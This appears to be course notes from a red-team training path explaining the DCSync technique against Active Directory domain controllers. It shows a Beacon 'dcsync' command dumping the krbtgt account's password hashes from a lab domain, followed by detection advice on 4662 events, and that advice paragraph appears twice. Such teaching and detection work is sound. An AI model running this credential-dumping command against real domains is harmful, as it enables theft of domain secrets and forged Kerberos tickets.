
Domain controllers in a forest or domain frequently replicate data between themselves.  For instance, when a new user is created, the request is serviced by one domain controller (usually the closest one based on how the sites are architected).  Information about that new user is then replicated to all of the other DCs in that domain via the [Directory Replication Service](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) (DRS) protocol.

DCSync is a technique [[T1003.006](https://attack.mitre.org/techniques/T1003/006/)] where an adversary leverages this same protocol to pull replication data, specifically usernames and password hashes, from a domain controller.  This requires access as a domain or enterprise admin, or a domain controller computer account.

This capability is built into tools such as Mimikatz's `lsadump::dcsync` command.  Beacon also provides a `dcsync` alias which is a wrapper around Mimiktaz.  The adversary is free to pull any (or all) data from a DC, however a common target is the _krbtgt_ account.  Recall from the [Kerberos chapter](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=674b79df7385fdbe1c0e7737) that the secret (password hash) for this account is used to encrypt and sign TGTs.  Therefore, once an adversary possesses this hash, they can forge 'legitimate' (or at least, valid) TGTs for any user in the domain.

```powershell
beacon> dcsync contoso.com CONTOSO\krbtgt

[DC] 'contoso.com' will be the domain
[DC] 'lon-dc-1.contoso.com' will be the DC server
[DC] 'CONTOSO\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 24/01/2025 13:50:53
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 2d454c2120b54890b3db65406e5a5974
    ntlm- 0: 2d454c2120b54890b3db65406e5a5974
    lm  - 0: 6666c48c4b440676cfda7be586409948

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1a8b1df83c2cdbeadba591130490e21d

* Primary:Kerberos-Newer-Keys *
    Default Salt : CONTOSO.COMkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
      aes128_hmac       (4096) : 90e173c1fedcdfeaeddb07e695b75cfa
      des_cbc_md5       (4096) : 2f2a8f347fdf94f1
```

Because DRS is legitimately used, its mere presence does not constitute a breach in the environment.  Defenders must look for anomalous replication requests that stand out from the norm, for example those that originate from IPs other than known domain controllers.

When Directory Service Access auditing is enabled, these replications are logged as 4662 events.  The identifying GUID is `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` for **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All**, or `89e95b76-444d-4c62-991a-0facbeda640c` for **DS-Replication-Get-Changes-In-Filtered-Set**.

# _OPSEC Considerations_

Because DRS is legitimately used, its mere presence does not constitute a breach in the environment.  Defenders must look for anomalous replication requests that stand out from the norm, for example those that originate from IPs other than known domain controllers.

When Directory Service Access auditing is enabled, these replications are logged as 4662 events.  The identifying GUID is `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` for **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All**, or `89e95b76-444d-4c62-991a-0facbeda640c` for **DS-Replication-Get-Changes-In-Filtered-Set**.

![[Pasted image 20250724120150.png]]
